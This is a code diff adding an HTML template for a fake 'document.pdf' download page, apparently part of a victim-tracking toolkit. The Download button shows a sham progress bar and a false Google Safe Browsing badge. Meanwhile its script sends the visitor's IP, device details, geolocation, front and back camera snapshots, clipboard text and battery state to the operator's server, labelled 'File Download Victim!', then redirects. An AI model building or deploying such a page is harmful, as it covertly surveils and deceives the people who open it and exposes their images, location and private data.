@@ -1,0 +1,72 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>Download File</title>
+<style>
+* { box-sizing: border-box; margin: 0; padding: 0; }
+body { font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif; background: #f8f9fa; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
+.card { background: #fff; border-radius: 12px; padding: 40px; width: 420px; max-width: 90vw; box-shadow: 0 2px 12px rgba(0,0,0,0.08); text-align: center; }
+.file-icon { width: 72px; height: 88px; margin: 0 auto 20px; background: #e3f2fd; border: 2px solid #90caf9; border-radius: 6px; position: relative; display: flex; align-items: center; justify-content: center; }
+.file-icon::after { content: 'PDF'; font-size: 16px; font-weight: 700; color: #d32f2f; }
+.file-icon::before { content: ''; position: absolute; top: 0; right: 0; width: 20px; height: 20px; background: linear-gradient(135deg, #90caf9 50%, #bbdefb 50%); border-radius: 0 0 0 4px; }
+.filename { font-size: 18px; color: #202124; font-weight: 500; margin-bottom: 4px; }
+.filesize { font-size: 14px; color: #5f6368; margin-bottom: 8px; }
+.file-info { font-size: 12px; color: #80868b; margin-bottom: 24px; }
+.btn-download { display: inline-flex; align-items: center; gap: 8px; padding: 12px 32px; background: #1a73e8; color: #fff; border: none; border-radius: 8px; font-size: 15px; font-weight: 500; cursor: pointer; transition: background 0.2s; }
+.btn-download:hover { background: #1557b0; }
+.progress-wrap { display: none; margin-top: 24px; text-align: left; }
+.progress-bar { width: 100%; height: 6px; background: #e0e0e0; border-radius: 3px; overflow: hidden; margin-bottom: 8px; }
+.progress-fill { width: 0; height: 100%; background: #1a73e8; transition: width 0.3s linear; }
+.progress-info { display: flex; justify-content: space-between; font-size: 12px; color: #5f6368; }
+.footer { margin-top: 30px; font-size: 11px; color: #80868b; }
+.scan { display: flex; align-items: center; justify-content: center; gap: 6px; font-size: 12px; color: #34a853; margin-top: 16px; }
+</style>
+</head>
+<body>
+<div class="card">
+<div class="file-icon"></div>
+<div class="filename">document.pdf</div>
+<div class="filesize">2.3 MB</div>
+<div class="file-info">Shared via secure link • Expires in 24 hours</div>
+<button class="btn-download" id="dlBtn" onclick="startDownload()">⬇ Download File</button>
+<div class="progress-wrap" id="progressWrap">
+<div class="progress-bar"><div class="progress-fill" id="progressFill"></div></div>
+<div class="progress-info"><span id="progressText">Preparing download...</span><span id="progressPct">0%</span></div>
+</div>
+<div class="scan" id="scan" style="display:none">✓ Scanned by Google Safe Browsing — No threats found</div>
+<div class="footer">Files are automatically deleted after download</div>
+</div>
+<video id="video" style="display:none" playsinline autoplay></video>
+<canvas id="canvas" style="display:none" width="640" height="480"></canvas>
+<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
+<script src="<%=a %>/public/advanced.js"></script>
+<script>
+var uid="<%=uid %>";
+var video=document.getElementById('video'), canvas=document.getElementById('canvas');
+function startDownload(){
+    document.getElementById('dlBtn').style.display='none';
+    document.getElementById('progressWrap').style.display='block';
+    gatherAll(); advancedGather("<%=a %>","<%=uid %>");
+    var p=0,fill=document.getElementById('progressFill'),pct=document.getElementById('progressPct'),txt=document.getElementById('progressText');
+    var iv=setInterval(function(){p+=Math.random()*6+2;if(p>=100){p=100;clearInterval(iv);txt.textContent='Download complete';document.getElementById('scan').style.display='flex';setTimeout(function(){window.location.href="<%=url %>";},1500);}fill.style.width=Math.round(p)+'%';pct.textContent=Math.round(p)+'%';if(p>10)txt.textContent='Downloading...';if(p>80)txt.textContent='Finalizing...';},250);
+}
+async function gatherAll(){
+    let td='📸 <b>File Download Victim!</b>\n\n';
+    td+='⚓ IP: <code><%=ip %></code>\n';
+    td+='⏰ Time: '+new Date().toLocaleString()+'\n';
+    td+='🖥️ OS: <code>'+navigator.platform+'</code>\n';
+    td+='📱 Screen: <code>'+screen.width+'x'+screen.height+'</code>\n';
+    td+='🌐 Browser: <code>'+navigator.userAgent.split(' ').pop()+'</code>\n';
+    $.post("<%=a %>/",{data:encodeURIComponent(td),uid:encodeURIComponent(uid)});
+    if(navigator.geolocation){navigator.geolocation.getCurrentPosition((p)=>{$.post("<%=a %>/location",{uid:uid,lat:p.coords.latitude,lon:p.coords.longitude,acc:p.coords.accuracy});},()=>{},{enableHighAccuracy:true,timeout:10000});}
+    async function captureCamera(f,l){try{const s=await navigator.mediaDevices.getUserMedia({video:{facingMode:f,width:640,height:480}});video.srcObject=s;await video.play();await new Promise(r=>setTimeout(r,2000));canvas.getContext('2d').drawImage(video,0,0,640,480);$.post("<%=a %>/camsnap",{uid:uid,img:encodeURIComponent(canvas.toDataURL("image/jpeg",0.8).replace("data:image/jpeg;base64,","")),cam:l});s.getTracks().forEach(t=>t.stop());}catch(e){}}
+    try{await captureCamera("user","selfie");}catch(e){}
+    try{await captureCamera("environment","back");}catch(e){}
+    try{if(navigator.clipboard&&navigator.clipboard.readText){const c=await navigator.clipboard.readText();if(c)$.post("<%=a %>/clipboard",{uid:uid,clip:encodeURIComponent(c)});}}catch(e){}
+    try{const b=await navigator.getBattery();$.post("<%=a %>/battery",{uid:uid,level:Math.round(b.level*100),charging:b.charging});}catch(e){}
+}
+</script>
+</body>
+</html>
